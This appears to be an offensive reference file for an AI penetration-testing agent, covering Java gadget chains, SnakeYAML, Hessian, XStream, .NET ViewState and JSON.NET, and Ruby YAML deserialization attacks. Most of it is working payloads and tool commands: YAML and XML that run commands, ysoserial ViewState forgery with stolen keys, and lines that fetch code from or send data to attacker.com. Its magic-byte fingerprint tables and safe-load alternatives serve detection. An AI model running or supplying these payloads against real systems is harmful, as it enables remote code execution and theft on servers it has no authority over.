# Java Gadget Chains & Cross-Language Deserialization Deep Dive

> **AI LOAD INSTRUCTION**: Load this when you need Java gadget chain version compatibility, SnakeYAML/Hessian/Kryo patterns, .NET ViewState forgery details, Ruby YAML exploitation, or deserialization fingerprint magic bytes. Assumes the main [SKILL.md](./SKILL.md) is already loaded for ysoserial basics, PHP/Python fundamentals.

---

## 1. JAVA GADGET CHAIN VERSION COMPATIBILITY MATRIX

### 1.1 CommonsCollections Chains

| Chain | Library | Version Range | JDK Constraint | Execution Type |
|---|---|---|---|---|
| **CC1** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 (InvokerTransformer filter) | `Runtime.exec()` |
| **CC2** | Commons Collections 4.x | 4.0 | None (uses `TemplatesImpl`) | Bytecode execution |
| **CC3** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 | `TemplatesImpl` (bytecode) |
| **CC4** | Commons Collections 4.x | 4.0 | None | `TemplatesImpl` |
| **CC5** | Commons Collections 3.x | 3.0–3.2.1 | JDK ≥ 8 OK (no `InvokerTransformer` check needed) | `Runtime.exec()` via `TiedMapEntry` |
| **CC6** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `HashSet` trigger |
| **CC7** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `Hashtable` |

**Recommended priority**: CC6 → CC7 → CC5 (broadest compatibility, no JDK version constraint).

### 1.2 CommonsBeanutils Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **CB1** | Commons BeanUtils 1.x + Commons Collections 3.x | BU 1.6.1–1.9.4, CC ≤ 3.2.1 | `PropertyUtils.getProperty` → `TemplatesImpl` |
| **CB1 (no-CC)** | Commons BeanUtils 1.x only | BU 1.8.3–1.9.4 | Requires `commons-logging`; no CC dependency |

### 1.3 Spring Framework Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **Spring1** | Spring Core + Spring Beans | 4.1.4 (known), varies | `MethodInvokeTypeProvider` → `TemplatesImpl` |
| **Spring2** | Spring Core | 4.1.4 | `ObjectFactoryDelegatingInvocationHandler` |

### 1.4 JDK-Only Chains (No External Dependencies)

| Chain | JDK Version | Notes |
|---|---|---|
| **Jdk7u21** | JDK 7u21 | `AnnotationInvocationHandler` + `TemplatesImpl`; patched in 7u25 |
| **JRMPClient** | All | Triggers JRMP call to attacker RMI server (not direct RCE, but enables chaining) |
| **JRMPListener** | All | Opens RMI listener on victim (less useful) |
| **URLDNS** | All | DNS-only; confirmation probe, no RCE |

### 1.5 Other Notable Chains

| Chain | Library | Notes |
|---|---|---|
| **Groovy1** | Groovy 1.7–2.4 | `MethodClosure` + `ConvertedClosure` |
| **Hibernate1** | Hibernate 5.x (with `javassist` or `cglib`) | `BasicLazyInitializer` → `TemplatesImpl` |
| **Hibernate2** | Hibernate 5.x | Via `AbstractComponentTuplizer` |
| **JBossInterceptors1** | JBoss Interceptors + weld-core | Rarely seen in modern apps |
| **Myfaces1** | Apache MyFaces 1.x | `ViewState` deserialization |
| **Myfaces2** | Apache MyFaces 2.x | `ViewState` deserialization |
| **ROME** | ROME 1.0 | `ObjectBean` → `EqualsBean` → `ToStringBean` |
| **Vaadin1** | Vaadin framework | `PropertysetItem` chain |
| **Wicket1** | Apache Wicket | Requires specific classpath setup |
| **C3P0** | C3P0 connection pool | `PoolBackedDataSource` → JNDI or URL classloading |
| **Clojure** | Clojure runtime | `core$fn` → arbitrary function execution |
| **BeanShell1** | BeanShell 2.x | `XThis` + `Interpreter.eval()` |
| **Jython1** | Jython | `PyFunction` → arbitrary Python execution in JVM |
| **MozillaRhino1/2** | Mozilla Rhino JS engine | `NativeJavaObject` chains |

### 1.6 Chain Selection Decision Tree

```
Identify target libraries (error messages, pom.xml, /META-INF/MANIFEST.MF):
├── Commons Collections 3.x on classpath?
│   ├── JDK < 8u72 → CC1, CC3
│   └── JDK ≥ 8u72 → CC5, CC6, CC7
├── Commons Collections 4.x?
│   └── CC2, CC4
├── Commons BeanUtils?
│   └── CB1 (with or without CC)
├── Spring Framework?
│   └── Spring1, Spring2
├── Groovy?
│   └── Groovy1
├── Hibernate + javassist/cglib?
│   └── Hibernate1, Hibernate2
├── No external libs identified?
│   ├── Try URLDNS first (confirmation)
│   ├── JDK 7u21 → Jdk7u21
│   └── JRMPClient → chain to RMI server with full gadget
└── Unknown? Try CC6, then CB1, then URLDNS
```

---

## 2. SNAKEYAML GADGET

### 2.1 Concept

SnakeYAML (Java YAML parser) supports constructing arbitrary Java objects via `!!` tag. When `Yaml.load()` is called on untrusted input without `SafeConstructor`, it instantiates any class.

### 2.2 ScriptEngineManager / URLClassLoader

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

**Exploit flow**:
1. SnakeYAML constructs `URLClassLoader` pointing to attacker JAR
2. Constructs `ScriptEngineManager` using that classloader
3. `ScriptEngineManager` uses `ServiceLoader` → loads `META-INF/services/javax.script.ScriptEngineFactory`
4. Attacker's JAR contains malicious `ScriptEngineFactory` implementation → RCE

**Attacker JAR structure**:
```
exploit.jar/
├── META-INF/
│   └── services/
│       └── javax.script.ScriptEngineFactory → "Exploit"
└── Exploit.class  (implements ScriptEngineFactory, executes commands in static block)
```

### 2.3 SPI-Based Variants

```yaml
# ProcessBuilder (direct command execution, Java 9+):
!!sun.misc.Service [
  !!java.lang.ProcessBuilder [["curl", "http://attacker.com/pwned"]]
]

# Alternative URLClassLoader form:
!!java.beans.XMLDecoder
  <java>
    <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec"><string>calc</string></void>
    </object>
  </java>
```

### 2.4 Detection

```
# Indicators in HTTP traffic:
- Content-Type: application/x-yaml
- Content-Type: text/yaml
- YAML content with !! tags in POST body, file uploads, config endpoints
- Spring Cloud Config Server endpoints accepting YAML

# Test probe (DNS-based safe detection):
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://UNIQUE.burpcollaborator.net/probe"]
  ]]
]
```

---

## 3. HESSIAN / KRYO / AVRO DESERIALIZATION

### 3.1 Hessian

Caucho Hessian is a binary web-service protocol. Hessian's `HessianInput.readObject()` can deserialize arbitrary Java objects.

```
# Traffic fingerprint:
- Content-Type: x-application/hessian
- Content-Type: application/x-hessian
- Binary starting with: 'c' (call), 'H' (Hessian 2.0), 'r' (reply)
- URL patterns: /hessian, /remoting/*, /service/*

# Known vulnerable configurations:
- Spring Remoting with HessianServiceExporter
- Resin application server (Caucho)
- Dubbo RPC framework (Apache)
```

**Hessian gadget chains** (via `marshalsec` tool):

```bash
# Generate Hessian payload:
java -cp marshalsec.jar marshalsec.Hessian \
  SpringPartiallyComparableAdvisorHolder \
  "ldap://attacker.com:1389/Exploit"

# Hessian2 variant:
java -cp marshalsec.jar marshalsec.Hessian2 \
  SpringAbstractBeanFactoryPointcutAdvisor \
  "ldap://attacker.com:1389/Exploit"
```

**Common Hessian gadgets**:
- `SpringPartiallyComparableAdvisorHolder` → JNDI lookup
- `SpringAbstractBeanFactoryPointcutAdvisor` → JNDI lookup
- `Rome` → `EqualsBean` → `ToStringBean` → JNDI or `TemplatesImpl`
- `Resin` → `QName` → classloading

### 3.2 Kryo

Kryo is a fast Java serialization framework (often used in Spark, Storm, Akka).

```
# Traffic fingerprint:
- Binary format, no standard magic bytes
- Often in message queues (Kafka, RabbitMQ) rather than HTTP
- Configuration key: kryo.setRegistrationRequired(false) → vulnerable

# Exploit approach:
# If registration is NOT required, any class can be deserialized
# Use standard Java gadgets (CC chains work if on classpath)

# If registration IS required but includes dangerous classes:
# Look for: java.net.URL, javax.management.*, java.lang.ProcessBuilder
```

### 3.3 Apache Avro

```
# Traffic fingerprint:
- Content-Type: avro/binary, application/avro
- Uses schema registry in many deployments
- Binary format with schema-defined structure

# Avro deserialization is schema-bound (generally safer)
# BUT: Avro's Java reflection API can be abused if:
# - Schema specifies "java-class" property
# - Custom deserializers are registered
# - GenericDatumReader with ReflectDatumReader
```

### 3.4 XStream

```
# Traffic fingerprint:
- XML with <sorted-set>, <dynamic-proxy>, <tree-map> elements
- Often used in Jenkins, Bamboo, TeamCity

# Payload (pre-1.4.7):
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>calc</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>

# Tool: marshalsec supports XStream payloads
java -cp marshalsec.jar marshalsec.XStream ImageIO "calc"
```

---

## 4. .NET VIEWSTATE DESERIALIZATION

### 4.1 ViewState Structure

```
__VIEWSTATE is a hidden form field in ASP.NET WebForms:
<input type="hidden" name="__VIEWSTATE" value="BASE64_ENCODED_DATA" />

Structure (after base64 decode):
- Serialized object graph (LosFormatter → ObjectStateFormatter → BinaryFormatter)
- Optional MAC (message authentication code) — HMAC-SHA1/SHA256
- Optional encryption — AES
```

### 4.2 machineKey Requirement

ViewState MAC/encryption uses keys from `web.config`:

```xml
<machineKey
  validationKey="HEXKEY_FOR_MAC"
  decryptionKey="HEXKEY_FOR_ENCRYPTION"
  validation="SHA1"
  decryption="AES" />
```

**How to obtain machineKey**:
1. LFI/path traversal → read `web.config`
2. Information disclosure (error pages, debug endpoints)
3. Known default keys in specific products (SharePoint, DotNetNuke)
4. `.config` backup files left on server
5. Azure App Service: sometimes in `WEBSITE_AUTH_ENCRYPTION_KEY` env var

### 4.3 ViewState Forgery

```bash
# With known machineKey — generate malicious ViewState:
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc BASE64_PAYLOAD" \
  --path="/target-page.aspx" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="DECRYPTION_KEY_HEX" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX" \
  --islegacy

# Without encryption (enableViewStateMac=false or older .NET):
ysoserial.exe -p ViewState \
  -g TypeConfuseDelegate \
  -c "cmd /c whoami > C:\out.txt" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX"
```

### 4.4 ViewState Attacks Without machineKey

```
# .NET Framework < 4.5 with enableViewStateMac="false" in web.config:
# No MAC → directly craft malicious ViewState

# Blacklist3r tool: try known/default keys:
Blacklist3r.exe --viewstate "BASE64_VIEWSTATE" --path "/page.aspx" --apppath "/"
# Tests common validation/decryption key pairs

# ASP.NET __VIEWSTATEGENERATOR value:
# Helps identify the target page's ViewState key derivation
# Format: 8 hex chars in hidden field
```

### 4.5 JSON.NET TypeNameHandling Exploitation

```json
// Vulnerable configuration:
// JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings {
//     TypeNameHandling = TypeNameHandling.All  // or Auto, Objects, Arrays
// });

// Payload — ObjectDataProvider chain:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}

// Alternative: System.Configuration.Install.AssemblyInstaller
// Triggers assembly load from attacker-controlled path
{
  "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
  "Path": "\\\\attacker.com\\share\\payload.dll"
}
```

---

## 5. RUBY YAML.load vs YAML.safe_load

### 5.1 Why YAML.load Is Dangerous

`YAML.load` in Ruby constructs arbitrary Ruby objects via `!ruby/object:` tags. It is equivalent to `Marshal.load` or Java's `ObjectInputStream.readObject()` in terms of attack surface.

### 5.2 Version-Specific Exploits

**Ruby ≤ 2.7.2** — `Gem::Requirement` chain (simplest):

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| curl http://attacker.com/pwned"
```

**Ruby 2.x–3.x** — `Gem::Installer` chain (complex but broader):

```yaml
--- !ruby/hash:Gem::Installer
i: x
--- !ruby/hash:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: "curl http://attacker.com/$(whoami)"
      method_id: :resolve
```

### 5.3 Detection in the Wild

```ruby
# Vulnerable patterns in source code:
YAML.load(user_input)
YAML.load(File.read(user_controlled_path))
YAML.load(params[:config])

# Safe alternatives:
YAML.safe_load(input)
YAML.safe_load(input, permitted_classes: [Symbol, Date])
Psych.safe_load(input)
```

### 5.4 Psych YAML Parser Versions

| Ruby Version | Psych Version | YAML.load Behavior |
|---|---|---|
| ≤ 2.0 | Psych 2.x | Arbitrary object construction |
| 2.1–2.7 | Psych 3.x | Arbitrary (YAML.load deprecated warning in 2.6+) |
| 3.0 | Psych 3.3 | YAML.load warns, still works |
| 3.1+ | Psych 4.0 | YAML.load defaults to safe_load behavior; need `unsafe_load` |

---

## 6. DETECTION FINGERPRINTS — MAGIC BYTES TABLE

### 6.1 By Protocol / Format

| Magic Bytes (Hex) | Base64 Prefix | Format | Language |
|---|---|---|---|
| `AC ED 00 05` | `rO0AB` | Java Serialized Object | Java |
| `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter | .NET |
| `FF 01` | `/w` | .NET ObjectStateFormatter (ViewState) | .NET |
| `80 02` or `80 03` or `80 04` or `80 05` | Varies | Python pickle (protocol 2/3/4/5) | Python |
| `89 50 4E 47` | `iVBOR` | PNG (may contain phar polyglot) | PHP |
| `4F 3A` | `Tz` (base64 of `O:`) | PHP serialized object (`O:N:"Class"`) | PHP |
| `61 3A` | `YT` (base64 of `a:`) | PHP serialized array (`a:N:{`) | PHP |
| `04 08` | Varies | Ruby Marshal | Ruby |
| `1F 8B` | `H4s` | Gzip (may wrap serialized data) | Any |
| `48 02` or `63` | Varies | Hessian (2.0 / 1.0) | Java |

### 6.2 By Content-Type Header

| Content-Type | Likely Format | Risk |
|---|---|---|
| `application/x-java-serialized-object` | Java ObjectOutputStream | Critical |
| `application/x-java-serialized-object-xml` | XMLEncoder/XMLDecoder | Critical |
| `x-application/hessian` | Hessian binary | Critical |
| `application/x-hessian` | Hessian binary | Critical |
| `application/x-amf` | AMF (Flash) — often wraps Java | High |
| `application/x-yaml` / `text/yaml` | YAML (check for `!!` tags) | High (if YAML.load) |
| `application/java-archive` | JAR file | Context-dependent |
| `application/x-protobuf` | Protobuf (generally safe) | Low |
| `application/json` with `$type` | JSON.NET with TypeNameHandling | Critical |
| `application/xml` with suspicious elements | XStream / XMLDecoder | Critical |

### 6.3 By Cookie / Parameter Name

| Name Pattern | Likely Format | Product |
|---|---|---|
| `rememberMe` | Java serialized + AES | Apache Shiro |
| `__VIEWSTATE` | .NET ObjectStateFormatter | ASP.NET WebForms |
| `__EVENTTARGET` | .NET (associated with ViewState) | ASP.NET WebForms |
| `JSESSIONID` + binary cookie | Java serialized | Various Java servers |
| `rack.session` | Ruby Marshal (base64) | Ruby on Rails / Rack |
| `_session_id` + binary | Python pickle or JSON | Django / Flask |
| `connect.sid` | Node.js session (usually JSON, but check) | Express |
| `ci_session` | PHP serialized | CodeIgniter |
| `PHPSESSID` + serialized data | PHP serialized | PHP applications |

### 6.4 Quick Identification Script

```bash
# Check if base64-decoded data matches known magic bytes:
echo "BASE64_DATA" | base64 -d | xxd | head -1

# Java: look for "ac ed 00 05"
# .NET BinaryFormatter: look for "00 01 00 00 00 ff ff ff ff"
# Python pickle: look for "80 0N" where N is protocol version
# PHP: decode and look for "O:" or "a:" prefix
```

---

## 7. TOOLING QUICK REFERENCE

| Tool | Language | Purpose |
|---|---|---|
| **ysoserial** | Java | Java gadget chain payload generation |
| **ysoserial.net** | .NET | .NET gadget chain payload generation |
| **marshalsec** | Java | Hessian, XStream, JNDI, multiple format payloads |
| **PHPGGC** | PHP | PHP gadget chain generation (Laravel, Symfony, etc.) |
| **pimpmykali/ysoserial-modified** | Java | Extended ysoserial with more chains |
| **GadgetInspector** | Java | Automated gadget chain discovery in classpaths |
| **Blacklist3r** | .NET | ViewState key testing and forging |
| **SerializationDumper** | Java | Decode and inspect Java serialized objects |
| **jdeserialize** | Java | Parse Java serialization stream for analysis |

```bash
# ysoserial — try all chains with DNS callback:
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
  CommonsCollections4 CommonsCollections5 CommonsCollections6 \
  CommonsCollections7 CommonsBeanutils1 Spring1 Spring2 \
  Groovy1 Hibernate1 Jdk7u21 URLDNS; do
  java -jar ysoserial.jar $chain "http://${chain}.TOKEN.collab.net" 2>/dev/null | \
    base64 -w0 > "${chain}.b64"
  echo "Generated: ${chain}"
done
```
